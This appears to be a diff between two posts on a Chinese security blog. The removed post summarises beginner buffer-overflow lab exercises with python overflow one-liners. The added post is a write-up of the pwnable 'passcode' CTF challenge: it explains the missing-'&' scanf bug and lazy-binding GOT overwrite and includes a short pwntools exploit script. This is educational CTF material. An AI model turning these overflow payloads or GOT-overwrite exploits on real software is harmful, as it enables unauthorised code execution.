@@ -79,7 +79,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="PWN," />
+  <meta name="keywords" content="elf文件," />
 
 
 
@@ -97,18 +97,29 @@
 
 
 
-<meta name="description" content="0x00  pwn基础练习 　　这个算是比较基础的教程，因为学起来不会感觉到吃力，只要懂一些基本的知识就行了。这是一个实验课程，因此里面有好多实践的东西，感觉这样更能深刻理解其中的原理。还有就是感觉这个课程里针对缓冲区溢出攻击的几个方面分的也比较清晰。">
-<meta name="keywords" content="PWN">
+<meta name="description" content="以pwnable中passcode为例  0x00  前言前一段时间写了一篇延迟绑定相关的文章，苦于只理解原理，不知道如何利用，所以写的东西有点生涩却又没有实例来佐证演示。现在能够理解passcode的门道，就写一篇文章来讲解一下延迟绑定的利用。">
+<meta name="keywords" content="elf文件">
 <meta property="og:type" content="article">
-<meta property="og:title" content="合天实验室《pwn基础练习》学习总结">
-<meta property="og:url" content="http://lc.dropsec.xyz/2017/01/20/合天实验室《pwn基础练习》学习总结/index.html">
+<meta property="og:title" content="延迟绑定技术的利用">
+<meta property="og:url" content="http://lc.dropsec.xyz/2017/08/15/延迟绑定技术的利用/index.html">
 <meta property="og:site_name" content="HEADS43">
-<meta property="og:description" content="0x00  pwn基础练习 　　这个算是比较基础的教程，因为学起来不会感觉到吃力，只要懂一些基本的知识就行了。这是一个实验课程，因此里面有好多实践的东西，感觉这样更能深刻理解其中的原理。还有就是感觉这个课程里针对缓冲区溢出攻击的几个方面分的也比较清晰。">
+<meta property="og:description" content="以pwnable中passcode为例  0x00  前言前一段时间写了一篇延迟绑定相关的文章，苦于只理解原理，不知道如何利用，所以写的东西有点生涩却又没有实例来佐证演示。现在能够理解passcode的门道，就写一篇文章来讲解一下延迟绑定的利用。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-08-22T05:38:41.855Z">
+<meta property="og:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%B8%80.png">
+<meta property="og:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%BA%8C.png">
+<meta property="og:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%B8%89.png">
+<meta property="og:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E5%9B%9B.png">
+<meta property="og:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%BA%94.png">
+<meta property="og:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%9B%BE%E5%85%AD%EF%BC%88%EF%BC%89.png">
+<meta property="og:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%B8%83.png">
+<meta property="og:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E5%85%AB.png">
+<meta property="og:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%B9%9D.jpg">
+<meta property="og:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E5%8D%81.jpg">
+<meta property="og:updated_time" content="2017-11-23T11:17:42.377Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="合天实验室《pwn基础练习》学习总结">
-<meta name="twitter:description" content="0x00  pwn基础练习 　　这个算是比较基础的教程，因为学起来不会感觉到吃力，只要懂一些基本的知识就行了。这是一个实验课程，因此里面有好多实践的东西，感觉这样更能深刻理解其中的原理。还有就是感觉这个课程里针对缓冲区溢出攻击的几个方面分的也比较清晰。">
+<meta name="twitter:title" content="延迟绑定技术的利用">
+<meta name="twitter:description" content="以pwnable中passcode为例  0x00  前言前一段时间写了一篇延迟绑定相关的文章，苦于只理解原理，不知道如何利用，所以写的东西有点生涩却又没有实例来佐证演示。现在能够理解passcode的门道，就写一篇文章来讲解一下延迟绑定的利用。">
+<meta name="twitter:image" content="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%B8%80.png">
 
 
 
@@ -138,13 +149,13 @@
 
 
 
-  <link rel="canonical" href="http://lc.dropsec.xyz/2017/01/20/合天实验室《pwn基础练习》学习总结/"/>
+  <link rel="canonical" href="http://lc.dropsec.xyz/2017/08/15/延迟绑定技术的利用/"/>
 
 
 
 
 
-  <title>合天实验室《pwn基础练习》学习总结 | HEADS43</title>
+  <title>延迟绑定技术的利用 | HEADS43</title>
   
 
 
@@ -315,7 +326,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://lc.dropsec.xyz/2017/01/20/合天实验室《pwn基础练习》学习总结/">
+    <link itemprop="mainEntityOfPage" href="http://lc.dropsec.xyz/2017/08/15/延迟绑定技术的利用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="HEADS43">
@@ -332,7 +343,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">合天实验室《pwn基础练习》学习总结</h1>
+          <h1 class="post-title" itemprop="name headline">延迟绑定技术的利用</h1>
         
 
         <div class="post-meta">
@@ -344,8 +355,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-01-20T15:16:24+08:00">
-                2017-01-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-15T19:25:00+08:00">
+                2017-08-15
               </time>
             
 
@@ -362,7 +373,7 @@
 
           
           
-             <span id="/2017/01/20/合天实验室《pwn基础练习》学习总结/" class="leancloud_visitors" data-flag-title="合天实验室《pwn基础练习》学习总结">
+             <span id="/2017/08/15/延迟绑定技术的利用/" class="leancloud_visitors" data-flag-title="延迟绑定技术的利用">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -393,83 +404,93 @@
       
 
       
-        <p><strong>0x00  pwn基础练习</strong></p>
-<p>　　这个算是比较基础的教程，因为学起来不会感觉到吃力，只要懂一些基本的知识就行了。这是一个实验课程，因此里面有好多实践的东西，感觉这样更能深刻理解其中的原理。还有就是感觉这个课程里针对缓冲区溢出攻击的几个方面分的也比较清晰。</p>
+        <p><em>以pwnable中passcode为例</em></p>
+<hr>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>前一段时间写了一篇延迟绑定相关的文章，苦于只理解原理，不知道如何利用，所以写的东西有点生涩却又没有实例来佐证演示。现在能够理解passcode的门道，就写一篇文章来讲解一下延迟绑定的利用。</p>
 <a id="more"></a>
-<p><strong>0x01  缓冲区溢出攻击的基本操作</strong></p>
-<p>　　这个部分主要就是就是一些基础中的基础，比如说是汇编的基础和python的基础了解，然后就是对于gdb这个工具的使用吧。</p>
-<p>　　下面就来看看具体的分析流程：</p>
-<p>　　首先是cat到源码进行分析（源码如下），可以看到gets()函数有可能会引发缓冲区溢出，因为gets()函数读取数据时不会对内容缓冲区的长度进行检查，而如果输入超出缓冲区长度就会发生溢出。</p>
-<p>　　源码如下：</p>
-<pre>
+<h1 id="0x01-关于题目的源码"><a href="#0x01-关于题目的源码" class="headerlink" title="0x01 关于题目的源码"></a>0x01 关于题目的源码</h1><p>源码如下：</p>
+<pre><code> #include &lt;stdio.h&gt;
+ #include &lt;stdlib.h&gt;
 
-#include <stdio.h>
-int main(int argc, char** argv)
-{
-    int modified;
-    char buffer[64];
-    modified = 0;
-    gets(buffer);        // 引发缓冲区溢出
-    if (modified != 0)
-    {
-        printf("Congratulations, you pwned it.\n");
+void login(){
+    int passcode1;
+    int passcode2;
+
+    printf(&quot;enter passcode1 : &quot;);
+    scanf(&quot;%d&quot;, passcode1);
+    fflush(stdin);
+
+    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+    printf(&quot;enter passcode2 : &quot;);
+    scanf(&quot;%d&quot;, passcode2);
+
+    printf(&quot;checking...\n&quot;);
+    if(passcode1==338150 &amp;&amp; passcode2==13371337){
+            printf(&quot;Login OK!\n&quot;);
+            system(&quot;/bin/cat flag&quot;);
     }
-    else
-    {
-        printf("Please try again.\n");
+    else{
+            printf(&quot;Login Failed!\n&quot;);
+            exit(0);
     }
+ }
+
+void welcome(){
+    char name[100];
+    printf(&quot;enter you name : &quot;);
+    scanf(&quot;%100s&quot;, name);
+    printf(&quot;Welcome %s!\n&quot;, name);
+  }
+
+ int main(){
+    printf(&quot;Toddler&apos;s Secure Login System 1.0 beta.\n&quot;);
+
+    welcome();
+    login();
+
+    // something after login...
+    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
     return 0;
-}
+  }
+</code></pre><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02  分析"></a>0x02  分析</h1><p>先来分析一下溢出点在哪，发现在welcome()函数和login()函数的里面的scanf()函数都没有在第二个参数前加上取地址符&amp;，这样导致程序会把输入的数据当成地址指针来处理，然后将读入的数据放到这个指针对应的地址上，这就是一个可以利用的地方。</p>
+<p>我们先是选择用GDB这个工具来调试一下程序，发现在程序中main()函数中的welcome()函数和login()函数的esp指针都相同，这就说明其他们是在一个栈帧中运行的并没有分开运行（但是感觉他们又是只在同一个栈中而不是在同一个栈帧中，后续解决），这要的话他们的ebp应该就是相同的。<br><img src="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%B8%80.png" alt=""></p>
+<p><img src="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%BA%8C.png" alt=""></p>
+<p>接着调试我们还是会发现因为这两个函数的ebp相同，所以这两个函数中的三个变量name（address=ebp-0x70）、passcode1（address=ebp-0x10）和passcode2（address=ebp-0xC）的相对地址是固定的，其中name和passcode1之间的距离是96个字节，但是程序给name初始化的数组大小是100个字节大小，因此我们可以通过name数组来操控passcode1的初始值。<br><img src="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%B8%89.png" alt=""></p>
+<p><img src="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E5%9B%9B.png" alt=""></p>
+<p><img src="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%BA%94.png" alt=""></p>
+<p>上面说的scanf()函数的利用，下面展开讲解，先是反编译一下login()函数，如下图，发现在call这个函数之前会先压栈两个参数；</p>
+<p><img src="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%9B%BE%E5%85%AD%EF%BC%88%EF%BC%89.png" alt=""></p>
+<p>分别是先将ebp-0x10地址处的数据存放到esp+0x4处作为scanf()函数的第二个参数：地址表项<br><img src="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%B8%83.png" alt=""></p>
+<p>再将第一个参数，也就是输入的格式化字符串</p>
+<p><img src="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E5%85%AB.png" alt=""></p>
+<p>既然这样，那借助scanf()函数和name数组，可以达到修改任意地址上数据的目的。</p>
+<h1 id="0x03-具体利用"><a href="#0x03-具体利用" class="headerlink" title="0x03  具体利用"></a>0x03  具体利用</h1><p>经过上面的分析，已经知道的是有scanf()函数可以利用，然后就是因为welcome()函数和login()函数ebp相同，于是name数组也可以得出溢出长度。找到了溢出点，也得出了溢出长度，还有就剩下返回地址。<br>从程序的正常逻辑来看，只要使得passcode1=0x000528E6且passcode2=0x00CC07C9，这样就能运行system()函数，从而得到flag，但是发现并不能同时控制两个passcode。因此只能另辟蹊径，这里可以利用ELF的延迟绑定来实现我们的目的（延迟绑定的具体实现前参阅笔者前一篇文章）。</p>
+<p>从上面的分析得出，我们利用scanf()函数和name数组可以修改任意地址上的数据，那么为什么不利用这两个条件去修改使得程序之间跳转去执行system()函数呢?有想法，就要做出具体的措施，我们利用延迟绑定的特点，修改某个函数在.got.plt表中的地址，这样就可以达到目的。</p>
+<p>知道生面这些原理，接着就将这些东西都落实。这里我们选择利用printf()函数，所以我们可以使用objdump命令去获取该函数在.got.plt表中的数据，如下：</p>
+<p><img src="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E4%B9%9D.jpg" alt=""></p>
+<p>有了printf()函数的.got.plt表地址，还需要的就是system()函数的地址，这一题比较简单，直接就将system函数的地址泄露出来，这样也就不需要我们再去费心构建，可以直接反编译login()函数就可以得到，如下：</p>
+<p><img src="http://omkxe7cq3.bkt.clouddn.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%88%A9%E7%94%A8%E5%9B%BE%E5%8D%81.jpg" alt=""></p>
+<p>这样经过这些工作，我们需要的就都齐全了，接着就是构建exp：</p>
+<pre><code>from pwn import *
+elf = ELF(&quot;passcode&quot;)
+r = remote(&quot;127.0.0.1&quot;,&quot;12345&quot;)
+#r = process(&quot;./passcode&quot;)
 
-</stdio.h></pre>
+printfGotAddr = elf.got[&quot;printf&quot;]
+systemAddr = 134514147
 
-<p>　　然后是用gdb反汇编得到汇编代码进行分析，下面是对main函数中的汇编代码的解释：</p>
-<pre>
-0x080482a0 <+0>:   push   %ebp
-0x080482a1 <+1>:   mov    %esp,%ebp
-0x080482a3 <+3>:   and    $0xfffffff0,%esp
- esp = esp - 0x60，即在栈上分配0x60）字节的空间
-0x080482a6 <+6>:   sub    $0x60,%esp
- modified变量位于esp + 0x5C处，将其初始化为0
-0x080482a9 <+9>:   movl   $0x0,0x5c(%esp)
- buffer位于esp + 0x1C处
-0x080482b1 <+17>:  lea    0x1c(%esp),%eax
-0x080482b5 <+21>:  mov    %eax,(%esp)
- 调用gets(buffer)读取输入数据
-0x080482b8 <+24>:  call   0x8049360 <gets>
- 判断modified变量的值是否是0
-0x080482bd <+29>:  cmpl   $0x0,0x5c(%esp)
- 如果modified的值等于0，就跳转到 0x080482d2
-0x080482c2 <+34>:  je     0x80482d2 <main+50>
- modified不为0，打印成功提示
-0x080482c4 <+36>:  movl   $0x80b3eec,(%esp)
-0x080482cb <+43>:  call   0x8049500 <puts>
-0x080482d0 <+48>:  jmp    0x80482de <main+62>
- modified为0，打印失败提示
-0x080482d2 <+50>:  movl   $0x80b3f0b,(%esp)
-0x080482d9 <+57>:  call   0x8049500 <puts>
-0x080482de <+62>:  mov    $0x0,%eax
-0x080482e3 <+67>:  leave
-0x080482e4 <+68>:  ret
+print &quot;the printfGotAddr is &quot;+ hex(printfGotAddr)
+print &quot;the systemAddr is &quot;+ hex(systemAddr)
 
+payload1 = &apos;a&apos; * 96 + p32(printfGotAddr)
+payload2 = str(systemAddr)
+r.sendline(payload1)
+r.sendline(payload2)
 
-</+68></+67></+62></puts></+57></+50></main+62></+48></puts></+43></+36></main+50></+34></+29></gets></+24></+21></+17></+9></+6></+3></+1></+0></pre>
-
-<p>　　看到上面的源码和汇编代码，程序的大概流程应该就清楚了，从中我们得知buffer在esp+0x1C处，而modified在esp+0x5C处，这两个地址之间隔着刚好六十四，也就是buffer数组的大小。因此，modified也就是从第六十五位输入的的数据开始，而在这个程序中只要是使得modified的值不为0就行，那也就是说只要第六十五个输入的对应ASCII值不为零就好了，事实也就是这样的。我们还可以直接使用python命令pwn掉程序：python -c “print ‘A’*64+’B’” | ./pwn1，这样更能体验到pwn的乐趣，但这也是前面大量工作的铺垫。</p>
-<p>　　最后挖一个坑，实验里面的成功提示信息的地址是从何得来的，有时间再仔细的过一遍吧。</p>
-<p><strong>0x02  精确覆盖变量数据</strong></p>
-<p>　　这个感觉跟第一课时的差别不是很大，这个课时的示例程序是一个带有两个参数的main函数，两个参数方分别是参数的个数argc另一个argv则是指向一个具体存储参数内容的字符串数组。感觉这个程序和上一个的区别在于，上一个是一个，随便溢出都行，这个则是需要计算出需要溢出的长度和内容。而这里呢就涉及到一个大端小段存储的知识点，这是两种不同的存储方式，我们只需记得小端存储就是高位数据存在高地址，低位数据存在低地址。</p>
-<p>　　经过和第一课时相同的分析过程，得出这个程序正常运行是不会跳转到成功信息的，需要的是对溢出的信息控制为0x61626364。也和上一课时一样，buffer位于esp+0x1C处，而modified位于esp+0x5C处，他们相差64，所以得溢出四位数据来，先用1234来测试发现其是使用的小端存储，于是控制溢出信息为\x64\x63\x62\x61，这样的话使用python就能一步解决了：python -c “print ‘A’*64+’dcba’” | xargs ./pwn2（xargs是Linux中的一个命令，它可以将输入数据当做命令行参数传给指定的程序）</p>
-<p><strong>0x03  环境变量继承</strong></p>
-<p>　　第三课时的环境变量的继承就有点难度了，虽说跟前面的差不多的分析过程但是首先得懂得环境变量继承的原理。</p>
-<p>　　所谓程序运行的环境也就是一个外部条件，或者说他运行时的外部的样子，同时，跟子承父业一样当一个父进程启动一个子进程时，这个子进程会继承父进程的环境变量。在上一课时的main函数里还可以有个参数，它是指向另一个数组的，这个数组存储的是具体的环境变量参数，而在这个示例程序中是使用了buffer通过strcpy()函数模拟子进程继承父进程的环境变量值variable，而modified则是需要控制的溢出值，同上的分析过程，结果也同上，需要控制的溢出内容是添加一个六十八位的数据（后四位按要求来）来作为新的环境变量。</p>
-<p>　　而这个步骤却可以有两种不同的方式来解决，一种是按部就班的使用Linux语句命令来进行运行。另一种则是使用python脚本来实现，也就是事先编辑好了一串命令，来运行直接达到你的目的。具体的脚本参见附件。</p>
-<p><strong>0x04  函数指针改写</strong></p>
-<p>　　这个函数指针的改写，我觉得跟前面的一样，就是改变了一下形式，这里是要溢出覆盖的是一串地址，也就是相当于是修改一个函数的入口地址，是这个程序按照你的意思来运行，借以达到目的。</p>
-<p> 　　这里面涉及到了objdump这个工具的使用，之前也稍微接触过，如果说gdb是Linux的OD，那它就是Linux的ida（差不多，但感觉不如ida强大），也就是倚天屠龙的关系。这个工具可以静态调试程序，查看每个功能函数的汇编。</p>
-<p>　　这个示例程序是先设一个函数指针，然后使用gets()函数来获取他，这样只用上面的分析然后进行溢出控制，是的函数指针的值变为win()函数的入口地址就好了，而函数的入口地址使用objdump查看就好了。这样也是很容易就pwn掉了它。</p>
-<p><strong>0x05  溢出攻击的总结</strong></p>
-<p>　　通过这几个课时的学习，也差不多了解了其中的原理。首先我们得找出溢出点，还得知道溢出长度，这样才能去编写shellcode来攻击它，得到我们想要的结果。</p>
+print r.recv()
+</code></pre><p>运行即可得到flag。</p>
+<h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04  小结"></a>0x04  小结</h1><p>下面简单梳理一下整个过程：</p>
+<p>按照程序的流程，先是在welcome()函数中输入100个字节大小的字符，但是从第九十七位起的末尾四位可以覆盖到passcode1的地址上去，而这个passcode1地址上存储的是下面一个scanf()函数的第二个参数地址表项，同时该参数前没有取地址符，因而可以通过这四个字节的字符去控制scanf()函数执行到目标地址，接着是scanf()函数的第一个参数也就是需要写入的数据，这里用system()函数的地址来替代，这样就能达到将printf()函数的.got.plt表中的地址替换成system()函数的地址，这样在下面再次调用printf()函数的时候，实际调用的就是system()函数，进而就达到目的了。</p>
 
       
     </div>
@@ -487,7 +508,7 @@ int main(int argc, char** argv)
       
         <div class="post-tags">
           
-            <a href="/tags/PWN/" rel="tag"># PWN</a>
+            <a href="/tags/elf文件/" rel="tag"># elf文件</a>
           
         </div>
       
@@ -500,8 +521,8 @@ int main(int argc, char** argv)
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/12/20/堆栈结构浅析/" rel="next" title="堆栈结构浅析">
-                <i class="fa fa-chevron-left"></i> 堆栈结构浅析
+              <a href="/2017/07/29/学习蒸米师傅《一步一步学ROP之x86篇》笔记/" rel="next" title="读蒸米大神《一步一步学ROP之x86篇》笔记">
+                <i class="fa fa-chevron-left"></i> 读蒸米大神《一步一步学ROP之x86篇》笔记
               </a>
             
           </div>
@@ -510,8 +531,8 @@ int main(int argc, char** argv)
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/02/04/Reserve系列题目浅析（一）/" rel="prev" title="Reserve系列题目浅析（一）">
-                Reserve系列题目浅析（一） <i class="fa fa-chevron-right"></i>
+              <a href="/2017/10/25/整数溢出整理/" rel="prev" title="整数溢出漏洞原理及实例分析">
+                整数溢出漏洞原理及实例分析 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -592,8 +613,17 @@ var jiathis_config={
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           
             <img class="site-author-image" itemprop="image"
@@ -676,6 +706,22 @@ var jiathis_config={
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00  前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-关于题目的源码"><span class="nav-number">2.</span> <span class="nav-text">0x01 关于题目的源码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-分析"><span class="nav-number">3.</span> <span class="nav-text">0x02  分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-具体利用"><span class="nav-number">4.</span> <span class="nav-text">0x03  具体利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-小结"><span class="nav-number">5.</span> <span class="nav-text">0x04  小结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
